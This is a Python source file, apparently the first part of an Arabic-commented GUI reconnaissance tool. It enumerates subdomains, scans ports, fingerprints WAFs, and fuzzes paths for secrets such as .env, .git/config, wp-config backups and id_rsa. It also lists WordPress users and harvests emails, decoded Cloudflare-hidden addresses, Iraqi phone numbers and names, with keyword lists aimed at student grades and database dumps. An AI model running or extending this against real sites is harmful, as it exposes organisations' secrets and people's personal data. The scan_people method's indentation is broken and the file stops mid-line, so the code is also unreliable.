#===== JAFAR ALSADIQ v4.0 — Part 1 =====
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import threading, requests, socket, ssl, re, os, time
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse, urljoin, unquote
import webbrowser, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Engine:
    def __init__(self):
        self.s = requests.Session()
        self.s.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Accept-Charset': 'utf-8'})
        self.s.verify = False
        a = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0)
        self.s.mount('http://', a); self.s.mount('https://', a)

        self.fake_em = {
            'example.com','test.com','domain.com','aspmx','google.com','googlemail',
            'outlook.com','hotmail.com','yahoo.com','gmail.com','sentry.io','gravatar.com',
            'wordpress.org','wp.com','jquery.com','cloudflare.com','github.com','npmjs.com',
            'schema.org','w3.org','ogp.me','facebook.com','twitter.com','instagram.com',
            'linkedin.com','youtube.com','google-analytics.com','amazonaws.com',
            'cloudfront.net','wixpress.com','bootstrap.com','fontawesome.com','gstatic.com',
            'googleapis.com','googlesyndication.com','doubleclick.net','googletagmanager.com',
            'addthis.com','disqus.com','wordpress.com','sucuri.net','maxcdn.com',
            'jsdelivr.net','unpkg.com','cdnjs.cloudflare.com','creativecommons.org',
            'apple.com','microsoft.com','amazon.com','x.com','cloudflare.net'}

        self.skip_social = {
            'share','intent','sharer','plugins','dialog','login','oauth','widget','badge',
            'button','api','embed','watch','hashtag','settings','help','privacy','terms',
            'policy','about','explore','search','status','stories','channel','user','c'}

        self.skip_comments = {
            'icon','wrapper','boxed','fusion','row','col','sidebar','footer','header',
            'nav','menu','container','section','widget','slider','banner','logo','hero',
            'modal','overlay','apple touch','android','ms edge','ie ','[if ','endif',
            'google tag','google analytics','gtag','site kit','recaptcha','adsense',
            'adsbygoogle','html5 element','ie6','ie7','ie8','ie9','conditional'}

        self.carriers = {}
        for p in range(780, 789): self.carriers[f'0{p}'] = 'زين'
        for p in range(770, 779): self.carriers[f'0{p}'] = 'آسياسيل'
        for p in range(750, 759): self.carriers[f'0{p}'] = 'كورك'
        for p in range(760, 769): self.carriers[f'0{p}'] = 'كورك'
        for p in range(740, 749): self.carriers[f'0{p}'] = 'فاستلنك'
        for p in range(730, 739): self.carriers[f'0{p}'] = 'إيرثلنك'

        # ملفات حساسة PDF
        self.sensitive_pdf = [
            'نتائج','طلاب','درجات','grades','results','students','marks','score',
            'exam','امتحان','بيانات','data','records','سجلات','كشف','قائمة',
            'list','student','grade','result','exam','transcript','roster']

        # صيغ بيانات مهمة
        self.data_ext = [
            'xls','xlsx','csv','xlsm','xltx','xltm','ods','sql','db','sqlite',
            'mdb','accdb','json','xml','zip','rar','7z','tar','gz','bak','old','dump']

        # JS هاشات مو مهمة
        self.js_hash_pattern = re.compile(r'^js_[A-Za-z0-9_\-]{20,}\.js$')
        self.hex_hash_pattern = re.compile(r'^[a-f0-9]{20,}\.js$')

        # JS مهمة
        self.important_js = [
            'env','config','api','auth','login','admin','main','app','index',
            'bundle','setting','credential','key','secret','token','database']

    def norm(self, u):
        u = u.strip()
        if not u.startswith(('http://', 'https://')): u = 'http://' + u
        return u.rstrip('/')

    def dom(self, u):
        return urlparse(self.norm(u)).netloc

    def carrier(self, ph):
        digits = re.sub(r'\D', '', ph)
        if digits.startswith('9647'):
            local = '0' + digits[3:]
        elif digits.startswith('07'):
            local = digits
        elif digits.startswith('7') and len(digits) == 10:
            local = '0' + digits
        else:
            return ''
        prefix = local[:4]
        carriers_map = {
            '0770':'آسياسيل','0771':'آسياسيل','0772':'آسياسيل',
            '0773':'آسياسيل','0774':'آسياسيل','0775':'آسياسيل',
            '0776':'آسياسيل','0777':'آسياسيل','0778':'آسياسيل',
            '0779':'آسياسيل',
            
            '0750':'كورك','0751':'كورك','0752':'كورك',
            '0753':'كورك','0754':'كورك','0755':'كورك',
            '0760':'كورك','0756':'كورك','0757':'كورك',
            '0758':'كورك','0759':'كورك',
            '0780':'زين','0781':'زين','0782':'زين',
            '0783':'زين','0784':'زين','0785':'زين',
            '0786':'زين','0787':'زين','0788':'زين',
            '0789':'زين','0790':'عراقنا','0791':'عراقنا',
            '0792':'عراقنا','0793':'عراقنا','0794':'عراقنا',
            '0795':'عراقنا','0796':'عراقنا',
            '0797':'عراقنا','0798':'عراقنا','0799':'عراقنا',
            '0740':'فاستلنك','0741':'فاستلنك',
            '0742':'فاستلنك','0743':'فاستلنك',
            '0730':'إيرثلنك','0731':'إيرثلنك',
            '0732':'إيرثلنك','0733':'إيرثلنك',
        }
        return carriers_map.get(prefix, '')

    def ok_email(self, em):
        el = em.lower()
        dom = el.split('@')[1] if '@' in el else ''
        if dom in self.fake_em: return False
        if any(f in el for f in self.fake_em): return False
        if len(em) < 6 or len(em.split('@')[0]) < 2: return False
        if re.match(r'^[0-9]+$', em.split('@')[0]): return False
        if em.count('@') != 1: return False
        if el.startswith(('dns@','hostmaster@','postmaster@','abuse@','noc@','root@','mailer-daemon@','no-reply@','noreply@')): return False
        return True

    def fix_encoding(self, text):
        if not text: return text
        try:
            if 'Ø' in text or 'Ù' in text or 'Â' in text:
                return text.encode('latin-1').decode('utf-8')
        except: pass
        return text

    def get_ip(self, d):
        r = {}
        try:
            ip = socket.gethostbyname(d); r['ip'] = ip
            g = requests.get(f"http://ip-api.com/json/{ip}?lang=ar", timeout=4).json()
            if g.get('status') == 'success':
                r.update({k: g.get(k, '?') for k in ['city','country','isp','org','as']})
        except Exception as e: r['error'] = str(e)[:50]
        return r

    def get_dns(self, d):
        rec = {}; soa_email = None
        for t in ['A','MX','NS','TXT','SOA']:
            try:
                j = requests.get(f"https://dns.google/resolve?name={d}&type={t}", timeout=4).json()
                a = j.get('Answer', [])
                if a: rec[t] = [x.get('data', '') for x in a]
            except: pass
        try:
            if 'SOA' in rec:
                parts = rec['SOA'][0].split()
                if len(parts) >= 2:
                    em = parts[1].replace('\\.', '[DOT]')
                    if '.' in em:
                        i = em.index('.')
                        soa_email = em[:i].replace('[DOT]', '.') + '@' + em[i+1:].replace('[DOT]', '.').rstrip('.')
        except: pass
        has_dmarc = False
        try:
            j = requests.get(f"https://dns.google/resolve?name=_dmarc.{d}&type=TXT", timeout=3).json()
            if j.get('Answer'): has_dmarc = True
        except: pass
        has_spf = any('spf' in str(r).lower() for r in rec.get('TXT', []))
        return rec, soa_email, has_dmarc, has_spf

    def get_whois(self, d):
        r = {}
        try:
            resp = requests.get(f"https://api.hackertarget.com/whois/?q={d}", timeout=5)
            if resp.status_code == 200:
                text = resp.text
                if any(x in text.lower() for x in ['error','exceeded','quota','limit','invalid']): return r
                for line in text.split('\n'):
                    if ':' not in line: continue
                    k, v = line.split(':', 1); k, v = k.strip().lower(), v.strip()
                    if not v: continue
                    for kk, vv in {
                        'registrant name':'reg_name','registrant organization':'reg_org',
                        'registrant email':'reg_email','registrant phone':'reg_phone',
                        'admin name':'admin_name','admin email':'admin_email',
                        'admin phone':'admin_phone','creation date':'created',
                        'expiry date':'expires'}.items():
                        if kk in k: r[vv] = v; break
                    if 'registrar' in k and 'abuse' not in k and 'registrar' not in r: r['registrar'] = v
        except: pass
        return r

    def get_ssl(self, d):
        r = {'valid': False, 'error': '', 'ver': '', 'issuer': {}, 'expires': ''}

        # ─── محاولة 1: requests HTTPS (الأدق مع Cloudflare) ───
        for attempt in range(2):  # حاول مرتين
            try:
                resp = requests.get(
                    f"https://{d}",
                    timeout=5,
                    verify=True,
                    headers={'User-Agent': 'Mozilla/5.0'})
                r['valid'] = True
                r['ver'] = 'TLS ✓'
                r['issuer'] = {'organizationName': 'Verified'}
                break
            except requests.exceptions.SSLError:
                r['error'] = 'شهادة غير موثوقة'
                break
            except (requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout):
                if attempt == 0:
                    time.sleep(1)  # انتظر ثانية وحاول مرة ثانية
                    continue
                r['error'] = 'بورت 443 لا يستجيب'
            except Exception as e:
                r['error'] = str(e)[:40]
                break

        # إذا نجحت المحاولة الأولى — نحاول نجيب تفاصيل الشهادة
        if r['valid']:
            try:
                ctx = ssl.create_default_context()
                with socket.create_connection((d, 443), timeout=4) as sk:
                    with ctx.wrap_socket(sk, server_hostname=d) as ss:
                        cert = ss.getpeercert()
                        r['ver'] = ss.version()
                        r['issuer'] = dict(
                            x[0] for x in cert.get('issuer', []))
                        r['expires'] = cert.get('notAfter', '?')
            except:
                # ما قدر يجيب التفاصيل بس SSL شغال
                pass
            return r

        # ─── محاولة 2: socket مباشر بدون تحقق ───
        if not r['valid']:
            try:
                ctx2 = ssl.create_default_context()
                ctx2.check_hostname = False
                ctx2.verify_mode = ssl.CERT_NONE
                with socket.create_connection((d, 443), timeout=4) as sk:
                    with ctx2.wrap_socket(sk, server_hostname=d) as ss:
                        r['valid'] = True
                        r['ver'] = ss.version()
                        r['error'] = 'شهادة موجودة (غير موثوقة)'
                        try:
                            cert = ss.getpeercert()
                            r['issuer'] = dict(
                                x[0] for x in cert.get('issuer', []))
                            r['expires'] = cert.get('notAfter', '?')
                        except:
                            pass
            except (socket.timeout, socket.error):
                if not r['error']:
                    r['error'] = 'بورت 443 مغلق أو لا يستجيب'
            except Exception as e:
                if not r['error']:
                    r['error'] = str(e)[:40]

        return r

    def get_http(self, url):
        r = {'headers': {}, 'server': '?', 'tech': [], 'status': 0,
             'size': 0, 'time': 0, 'title': '', 'waf': 'لا يوجد',
             'url': url, 'xpb': '', 'gen': '', 'cms': '', 'body': '',
             'error': ''}

        # نجرب HTTP أول بعدين HTTPS
        urls = []
        if 'https://' in url:
            urls = [url.replace('https://', 'http://'), url]
        else:
            urls = [url, url.replace('http://', 'https://')]

        resp = None
        last_error = ''

        for u in urls:
            try:
                t = time.time()
                resp = self.s.get(u, timeout=6, allow_redirects=True)
                r['time'] = round(time.time() - t, 2)
                r['status'] = resp.status_code
                r['size'] = len(resp.content)
                r['headers'] = dict(resp.headers)
                r['url'] = u
                r['error'] = ''  # reset error إذا نجح
                break
            except requests.exceptions.SSLError:
                last_error = 'SSL Error'
                continue
            except requests.exceptions.ConnectionError:
                last_error = 'تعذر الاتصال'
                continue
            except requests.exceptions.Timeout:
                last_error = 'Timeout'
                continue
            except Exception as ex:
                last_error = str(ex)[:50]
                continue

        # إذا كل المحاولات فشلت
        if not resp:
            r['error'] = last_error or 'تعذر الاتصال'
            return r

        # إذا رجع error code (403, 500...) مو معناه "تعذر"
        # الاتصال نجح لكن السيرفر رفض
        h = resp.headers
        r['server'] = h.get('Server', '?')
        r['xpb'] = h.get('X-Powered-By', '')

        # نحفظ الـ IP للـ WAF fallback
        try:
            r['ip'] = socket.gethostbyname(urlparse(r['url']).netloc)
        except:
            r['ip'] = ''
        # title
        try:
            t = re.search(r'<title[^>]*>(.*?)</title>',
                           resp.text, re.I | re.DOTALL)
            if t:
                r['title'] = self.fix_encoding(t.group(1).strip()[:100])
        except:
            pass

        # body للـ CVE detection
        r['body'] = resp.text[:50000] if resp.text else ''

        # ─── Tech Detection ───
        b = resp.text.lower()
        hs = str(h).lower()
        for n, ss in {
            'WordPress': ['wp-content', 'wp-includes'],
            'Joomla': ['joomla'],
            'Laravel': ['laravel_session'],
            'Django': ['csrfmiddlewaretoken'],
            'jQuery': ['jquery.min.js', 'jquery.js'],
            'Bootstrap': ['bootstrap.min.css', 'bootstrap.min.js'],
            'PHP': ['x-powered-by: php'],
            'Nginx': ['nginx'],
            'Apache': ['apache'],
            'Moodle': ['moodle'],
            'Drupal': ['drupal', 'form_build_id', 'sites/default/files'],
            'LiteSpeed': ['litespeed', 'x-lsadc'],
        }.items():
            for s in ss:
                if s in b or s in hs:
                    if n not in r['tech']:
                        r['tech'].append(n)
                    break

        # ─── WAF Detection — محسّن ───
        # ─── WAF Detection — شامل ───
        # ─── WAF Detection ───
        waf_signs = {
            'Cloudflare': [
                'cf-ray',
                'cf-cache-status',
                'cf-request-id',
                '__cfduid',
                '__cf_bm',
                'cf-connecting-ip',
                'cloudflare',
            ],
            'Sucuri': ['sucuri', 'x-sucuri-id', 'x-sucuri-cache'],
            'Incapsula': ['incap_ses', 'visid_incap', 'incap-ses'],
            'ModSecurity': ['mod_security', 'modsecurity'],
            'Akamai': ['akamai', 'x-akamai-transformed', 'x-check-cacheable'],
            'Fastly': ['fastly', 'x-fastly-request-id', 'x-served-by'],
            'AWS WAF': ['x-amzn-requestid', 'x-amzn-trace-id'],
            'Imperva': ['x-iinfo', 'x-cdn'],
        }

        # خزّن IP حقيقي للدومين الحالي حتى نستخدمه في fallback
        try:
            r['ip'] = socket.gethostbyname(urlparse(r['url']).netloc)
        except:
            r['ip'] = ''

        # نبني string شامل من كل المعلومات
        try:
            all_headers_lower = {str(k).lower(): str(v).lower()
                                 for k, v in h.items()}
        except:
            all_headers_lower = {}

        headers_str = ' '.join(
            [f"{k}:{v}" for k, v in all_headers_lower.items()])
        cookies_str = str(resp.cookies).lower()
        server_str = str(h.get('Server', '')).lower()
        body_lower = resp.text[:2000].lower()

        check_str = (
            headers_str + ' ' +
            cookies_str + ' ' +
            server_str + ' ' +
            body_lower
        )

        # كشف مباشر من الهيدرز / الكوكيز / body
        for waf_name, signs in waf_signs.items():
            for sign in signs:
                if sign in check_str:
                    r['waf'] = waf_name
                    break
            if r['waf'] != 'لا يوجد':
                break

        # ─── Cloudflare fallbacks ───
        if r['waf'] == 'لا يوجد':
            # fallback 1: Server header
            if 'cloudflare' in server_str:
                r['waf'] = 'Cloudflare'

        if r['waf'] == 'لا يوجد':
            # fallback 2: IP ranges
            cf_ranges = [
                '104.16.', '104.17.', '104.18.', '104.19.',
                '104.20.', '104.21.', '104.22.', '104.23.',
                '104.24.', '104.25.', '104.26.', '104.27.',
                '172.64.', '172.65.', '172.66.', '172.67.',
                '172.68.', '172.69.', '172.70.', '172.71.',
                '162.158.', '198.41.', '190.93.', '188.114.',
                '197.234.', '141.101.',
            ]
            ip = r.get('ip', '')
            if any(ip.startswith(prefix) for prefix in cf_ranges):
                r['waf'] = 'Cloudflare'

        if r['waf'] == 'لا يوجد':
            # fallback 3: body analysis
            if 'attention required' in body_lower:
                r['waf'] = 'Cloudflare'
            elif 'cloudflare ray id' in body_lower:
                r['waf'] = 'Cloudflare'
            elif 'error 1010' in body_lower:
                r['waf'] = 'Cloudflare'
            elif 'error 1020' in body_lower:
                r['waf'] = 'Cloudflare'
            elif '403 forbidden' in body_lower and 'cloudflare' in body_lower:
                r['waf'] = 'Cloudflare'

        # ─── CMS Detection ───
        gen = re.search(
            r'<meta\s+name=["\']generator["\']\s+content=["\'](.*?)["\']',
            resp.text, re.I)
        if gen:
            r['gen'] = gen.group(1)

        if 'WordPress' in r['tech']:
            r['cms'] = 'WordPress'
            v = re.search(r'WordPress\s+([\d.]+)', resp.text, re.I)
            if not v:
                v = re.search(
                    r'content="WordPress\s+([\d.]+)"',
                    resp.text, re.I)
            if v:
                r['cms_ver'] = v.group(1)

        elif 'Drupal' in r['tech']:
            r['cms'] = 'Drupal'
            v = re.search(r'Drupal\s+([\d.]+)', resp.text, re.I)
            if v:
                r['cms_ver'] = v.group(1)

        elif 'Joomla' in r['tech']:
            r['cms'] = 'Joomla'
            v = re.search(r'Joomla!\s+([\d.]+)', resp.text, re.I)
            if v:
                r['cms_ver'] = v.group(1)

        return r

    def get_headers(self, hdrs):
        c = {}; hl = {h.lower(): v for h, v in hdrs.items()}
        for h, (s, _) in {
            'X-Frame-Options':('متوسط',''),'Content-Security-Policy':('عالي',''),
            'X-XSS-Protection':('منخفض',''),'X-Content-Type-Options':('منخفض',''),
            'Strict-Transport-Security':('عالي',''),'Referrer-Policy':('منخفض',''),
            'Permissions-Policy':('منخفض','')}.items():
            p = h.lower() in hl; v = hl.get(h.lower(), '')
            if not p:
                for hk in hl:
                    if h.lower().replace('-', '') == hk.replace('-', ''): p = True; v = hl[hk]; break
            c[h] = {'p': p, 's': s, 'v': str(v)[:80]}
        return c

    def get_ports(self, ip):
        pl = [21,22,23,25,53,80,110,143,443,445,993,995,1433,3306,3389,5432,5900,6379,8080,8443,9200,27017]
        sv = {21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',143:'IMAP',
              443:'HTTPS',445:'SMB',993:'IMAPS',995:'POP3S',1433:'MSSQL',3306:'MySQL',3389:'RDP',
              5432:'PostgreSQL',5900:'VNC',6379:'Redis',8080:'HTTP-Proxy',8443:'HTTPS-Alt',
              9200:'ES',27017:'MongoDB'}
        dng = {3306,5432,27017,6379,3389,5900,9200,1433,23}; results = []
        def chk(p):
            try:
                s = socket.socket(); s.settimeout(0.5)
                if s.connect_ex((ip, p)) == 0: s.close(); return {'p':p,'sv':sv.get(p,str(p)),'d':p in dng}
                s.close()
            except: pass
        with concurrent.futures.ThreadPoolExecutor(max_workers=22) as ex:
            for r in ex.map(chk, pl):
                if r: results.append(r)
        results.sort(key=lambda x: x['p']); return results

    def get_banners(self, ip, ports):
        results = []
        for p in [x['p'] for x in ports]:
            try:
                s = socket.socket(); s.settimeout(1.2)
                if s.connect_ex((ip, p)) != 0: s.close(); continue
                s.send(b'HEAD / HTTP/1.1\r\nHost: t\r\n\r\n' if p in [80,443,8080,8443] else b'\r\n')
                b = s.recv(1024).decode('utf-8', errors='ignore').strip(); s.close()
                if b: results.append({'p': p, 'b': b[:200]})
            except: pass
        return results

    def get_subs(self, d, cb=None):
        subs = set()
        if d.startswith('www.'): d = d[4:]

        def fetch_crtsh():
            try:
                resp = requests.get(
                    f"https://crt.sh/?q=%.{d}&output=json",
                    timeout=8)
                if resp.status_code == 200:
                    for e in resp.json():
                        for n in e.get('name_value','').split('\n'):
                            n = n.strip().lower()
                            if n.endswith(d) and '*' not in n:
                                subs.add(n)
            except: pass

        def fetch_hackertarget():
            try:
                resp = requests.get(
                    f"https://api.hackertarget.com/hostsearch/?q={d}",
                    timeout=5)
                if resp.status_code == 200:
                    text = resp.text
                    if not any(x in text.lower() for x in
                               ['error','exceeded','quota']):
                        for line in text.split('\n'):
                            if ',' in line:
                                x = line.split(',')[0].strip().lower()
                                if x.endswith(d): subs.add(x)
            except: pass

        def fetch_alienvault():
            try:
                resp = requests.get(
                    f"https://otx.alienvault.com/api/v1/indicators/domain/{d}/passive_dns",
                    timeout=5)
                if resp.status_code == 200:
                    for entry in resp.json().get('passive_dns', []):
                        h = entry.get('hostname','').lower()
                        if h.endswith(d): subs.add(h)
            except: pass

        def fetch_brute():
            common = [
                'www','mail','webmail','cpanel','portal','student',
                'staff','library','api','admin','login','lms',
                'moodle','elearning','journal','journals','hr',
                'accounts','ris','erp','forms','console','cv',
                'dorms','car-badge','centrallibrary','moodle2',
            ]
            def chk(name):
                sub = f"{name}.{d}"
                try:
                    socket.gethostbyname(sub)
                    return sub
                except: return None
            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
                for r in ex.map(chk, common):
                    if r: subs.add(r)

        # ─── كل المصادر بشكل متوازٍ ───
        if cb: cb("جمع subdomains...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
            futures = [
                ex.submit(fetch_crtsh),
                ex.submit(fetch_hackertarget),
                ex.submit(fetch_alienvault),
                ex.submit(fetch_brute),
            ]
            concurrent.futures.wait(futures)

        if cb: cb(f"✅ {len(subs)} subdomain")
        return sorted(list(subs))

    def fuzz(self, url, wl=None, th=50, cb=None):
        url = self.norm(url)
        wu = url
        alive = False
        base_status = None
        base_size = None

        # نجرب نوصل للموقع
        for u in [url.replace('https://', 'http://'), url]:
            try:
                r = self.s.get(u, timeout=3, allow_redirects=True)
                if r.status_code > 0:
                    wu = u
                    alive = True
                    base_size = len(r.content)
                    break
            except:
                continue

        if not alive:
            return []

        # ═══ كشف Wildcard — نجرب مسار عشوائي ═══
        import random, string
        wildcard_final_url = None
        wildcard_final_size = None
        wildcard_final_status = None

        try:
            rand = ''.join(random.choices(string.ascii_lowercase, k=15))
            # نتبع الـ redirect
            wr = self.s.get(f"{wu}/{rand}", timeout=3,
                             allow_redirects=True)
            wildcard_final_status = wr.status_code
            wildcard_final_size = len(wr.content)
            wildcard_final_url = wr.url
        except:
            pass

        words = [
            'admin', 'login', 'dashboard', 'wp-admin', 'wp-login.php',
            'phpmyadmin', 'cpanel', 'webmail', 'api', 'api/v1', 'backup',
            'backups', 'db', 'database', '.git', '.git/config', '.env',
            '.env.bak', '.htaccess', '.htpasswd', 'config', 'config.php',
            'wp-config.php', 'wp-config.php.bak', 'robots.txt',
            'sitemap.xml', 'server-status', 'phpinfo.php', 'test',
            'uploads', 'upload', 'files', 'media', 'static', 'assets',
            'log', 'logs', 'error_log', 'panel', 'console', 'manager',
            'portal', 'user', 'users', 'old', 'dev', 'staging',
            'xmlrpc.php', 'wp-json', 'wp-json/wp/v2/users',
            'readme.html', 'composer.json', 'package.json', 'install',
            'setup', 'web.config', '.dockerenv', 'id_rsa', 'credentials',
            'secrets', 'wp-content', 'wp-includes', 'cgi-bin', 'tmp',
            'cache', 'includes', 'CHANGELOG.txt', 'INSTALL.txt',
            'LICENSE.txt', 'cron.php', 'update.php',
            'sites/default/settings.php', 'configuration.php']

        if wl and os.path.exists(wl):
            try:
                with open(wl, 'r', encoding='utf-8', errors='ignore') as f:
                    words = [l.strip() for l in f
                             if l.strip() and not l.startswith('#')]
            except:
                pass

        total = len(words)
        done = [0]
        found = [0]
        results = []
        start = time.time()

        def chk(w):
            try:
                # نتبع الـ redirect ونشوف النهاية
                resp = self.s.get(f"{wu}/{w}", timeout=1,
                                   allow_redirects=True)
                done[0] += 1
                st = resp.status_code
                sz = len(resp.content)
                final_url = resp.url

                # ═══ فلتر Wildcard ═══
                if wildcard_final_status and wildcard_final_size:
                    # نفس status + نفس حجم (±100 bytes) = وهمي
                    if (st == wildcard_final_status and
                            abs(sz - wildcard_final_size) < 100):
                        if cb and done[0] % 20 == 0:
                            _update_cb()
                        return

                # ═══ فلتر: إذا الـ final URL يساوي الـ wildcard URL ═══
                if wildcard_final_url and final_url == wildcard_final_url:
                    if cb and done[0] % 20 == 0:
                        _update_cb()
                    return

                # ═══ فقط 200 و 500 المهمين ═══
                if st not in [200, 500]:
                    if cb and done[0] % 20 == 0:
                        _update_cb()
                    return

                found[0] += 1
                # نحفظ الـ redirect الأصلي لا النهائي
                first_resp = self.s.get(f"{wu}/{w}", timeout=1,
                                         allow_redirects=False)
                rd = first_resp.headers.get('Location', '')

                results.append({
                    'p': f"/{w}",
                    'st': st,
                    'sz': sz,
                    'rd': rd,
                    'final': final_url
                })

                if cb and done[0] % 20 == 0:
                    _update_cb()

            except:
                done[0] += 1

        def _update_cb():
            if not cb:
                return
            elapsed = time.time() - start
            speed = done[0] / elapsed if elapsed > 0 else 0
            remain = int((total - done[0]) / speed) if speed > 0 else 0
            cb(done[0], total, found[0], remain)

        with concurrent.futures.ThreadPoolExecutor(
                max_workers=min(th, 50)) as ex:
            list(ex.map(chk, words))

        if cb:
            cb(total, total, found[0], 0)

        results.sort(key=lambda x: (x['st'], x['p']))
        return results

    def scan_people(self, url, d, all_emails):
        data = {
        'admins': [],
        'phones_iq': set(),
        'phones_intl': set(),
        'names': set(),
        'social': set()
    }
    url = self.norm(url)
    txt = ""

    # ─── صفحات موسعة — أكثر من قبل ───
    pages = [
        '/', '/contact', '/about', '/about-us', '/contact-us',
        '/team', '/staff', '/people', '/faculty', '/department',
        '/administration', '/management', '/leadership', '/our-team',
        '/contactus', '/about/team', '/about/staff',
        '/wp-json/wp/v2/users?per_page=100',    # WP REST API مباشر
        '/wp-json/wp/v2/users?context=embed',
        '/?feed=rss2',                           # RSS يكشف أسماء المؤلفين
        '/feed/', '/rss/', '/sitemap.xml',
        '/wp-sitemap-users-1.xml',               # WP sitemap للمستخدمين
        '/?rest_route=/wp/v2/users',             # إضافة مهمة!
        '/index.php?rest_route=/wp/v2/users',    # إضافة مهمة!
        '/wp-json/wp/v2/users?per_page=100&_fields=id,name,slug,email', # إضافة!
    ]

    def fetch_page(pg):
        try:
            r = self.s.get(f"{url}{pg}", timeout=4,
                           allow_redirects=True)
            if r.status_code == 200:
                return r.text
        except:
            pass
        return ""

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        results = list(ex.map(fetch_page, pages))

    # ⚠️ **الإصلاح**: دمج كل النتائج غير الفارغة في txt
    txt = "\n".join([r for r in results if r and len(r) > 10])

    # إذا لم يتم جمع أي نص، نحاول بطريقة بديلة (جلب الصفحة الرئيسية)
    if not txt or len(txt) < 100:
        try:
            r = self.s.get(url, timeout=5, allow_redirects=True)
            if r.status_code == 200:
                txt += r.text
        except:
            pass

    # ─── استخراج WP users من JSON مباشرة ───
    for res_text in results:
        if not res_text:
            continue
        try:
            # WP REST API JSON response
            if res_text.strip().startswith('['):
                users = __import__('json').loads(res_text)
                if isinstance(users, list):
                    for u in users:
                        if isinstance(u, dict) and u.get('slug'):
                            slug = u.get('slug', '?')
                            name = u.get('name', u.get('slug', '?'))
                            uid  = u.get('id', '?')
                            link = u.get('link', '')
                            em_from_api = u.get('email', '')
                            if em_from_api and self.ok_email(em_from_api):
                                all_emails.add(em_from_api.lower())
                            # تجنب تكرار
                            existing_slugs = {a['slug'] for a in data['admins']}
                            if slug not in existing_slugs:
                                data['admins'].append({
                                    'name': self.fix_encoding(str(name)),
                                    'slug': slug,
                                    'id': uid,
                                    'link': link
                                })
        except:
            pass

    # إذا لم يكن هناك نص بعد كل هذا، نخرج ونعطي رسالة واضحة
    if not txt:
        return data

    # ─── إيميلات عادية (regex) ───
    for em in re.findall(
            r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',
            txt):
        if self.ok_email(em):
            all_emails.add(em.lower())

    # ─── إيميلات Cloudflare مشفرة (data-cfemail) — إصلاح ───
    # نمط أكثر دقة
    for fp in re.findall(r'data-cfemail=["\']([a-f0-9]+)["\']', txt, re.I):
        try:
            rv = int(fp[:2], 16)
            decoded = ''.join(
                [chr(int(fp[i:i+2], 16) ^ rv)
                 for i in range(2, len(fp), 2)])
            if self.ok_email(decoded):
                all_emails.add(decoded.lower())
        except:
            pass

    # ─── إيميلات Cloudflare (email-protection link) ───
    for enc in re.findall(
            r'email-protection#([a-f0-9]+)', txt):
        try:
            rv = int(enc[:2], 16)
            decoded = ''.join(
                [chr(int(enc[i:i+2], 16) ^ rv)
                 for i in range(2, len(enc), 2)])
            if self.ok_email(decoded):
                all_emails.add(decoded.lower())
        except:
            pass

    # ─── إيميلات مخفية بـ JS obfuscation شائع ───
    # مثل: "user" + "@" + "domain.com"
    for m in re.findall(
            r'["\']([a-zA-Z0-9._%+\-]+)["\']\s*\+\s*["\']@["\']\s*\+\s*["\']([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["\']',
            txt):
        em = f"{m[0]}@{m[1]}"
        if self.ok_email(em):
            all_emails.add(em.lower())

    # ─── إيميلات من RSS/Feed (author tags) ───
    for em in re.findall(
            r'<(?:author|email|managingEditor|webMaster)>([^<]+@[^<]+)</(?:author|email|managingEditor|webMaster)>',
            txt, re.I):
        em = em.strip()
        if self.ok_email(em):
            all_emails.add(em.lower())

    # ─── أسماء من RSS ───
    for nm in re.findall(r'<dc:creator><!\[CDATA\[(.*?)\]\]></dc:creator>', txt, re.I):
        if nm.strip():
            data['names'].add(self.fix_encoding(nm.strip()))

    # ─── هواتف عراقية — regex موسع ───
    phone_patterns_iq = [
        r'\+9647[0-9]{9}',
        r'009647[0-9]{9}',
        r'07[3-9][0-9][\s\-\.\u00A0]?[0-9]{3}[\s\-\.\u00A0]?[0-9]{4}',
        r'7[3-9][0-9][\s\-\.]?[0-9]{3}[\s\-\.]?[0-9]{4}',
    ]

    for pat in phone_patterns_iq:
        for ph in re.findall(pat, txt):
            digits = re.sub(r'\D', '', ph)
            if digits.startswith('9647'):
                norm = f"+{digits}"
            elif digits.startswith('07') and len(digits) == 11:
                norm = f"+964{digits[1:]}"
            elif digits.startswith('7') and len(digits) == 10:
                norm = f"+964{digits}"
            else:
                continue
            valid_prefixes = ('070','071','072','073','074',
                              '075','076','077','078','079')
            if any(norm[4:].startswith(p[1:]) for p in valid_prefixes):
                data['phones_iq'].add(norm)

    # ─── هواتف دولية ───
    for ph in re.findall(r'(?:\+|00)[1-9][0-9]{7,14}', txt):
        digits = re.sub(r'\D', '', ph)
        if 10 <= len(digits) <= 15:
            if not digits.startswith('964'):
                data['phones_intl'].add(ph)

    # ─── أسماء من meta tags ───
    for nm in re.findall(
            r'<meta\s+name=["\'](?:author|creator)["\'][^>]*content=["\'](.*?)["\']',
            txt, re.I):
        if nm.strip():
            data['names'].add(self.fix_encoding(nm.strip()))

    # ─── أسماء من JSON-LD (schema.org) ───
    for jld in re.findall(r'<script[^>]+type=["\']application/ld\+json["\'][^>]*>(.*?)</script>', txt, re.DOTALL | re.I):
        try:
            import json as _json
            obj = _json.loads(jld)
            for key in ['name', 'author', 'email', 'telephone']:
                val = obj.get(key, '')
                if isinstance(val, str) and val.strip():
                    if '@' in val and self.ok_email(val):
                        all_emails.add(val.lower())
                    elif key in ['name','author']:
                        data['names'].add(self.fix_encoding(val.strip()))
                elif isinstance(val, dict):
                    n = val.get('name','')
                    if n:
                        data['names'].add(self.fix_encoding(n.strip()))
                    e2 = val.get('email','')
                    if e2 and self.ok_email(e2):
                        all_emails.add(e2.lower())
        except:
            pass

    # ─── سوشيال ───
    for pl, pt in {
        'Facebook': r'facebook\.com/([a-zA-Z0-9.]{3,})',
        'Twitter/X': r'(?:twitter|x)\.com/([a-zA-Z0-9_]{2,})',
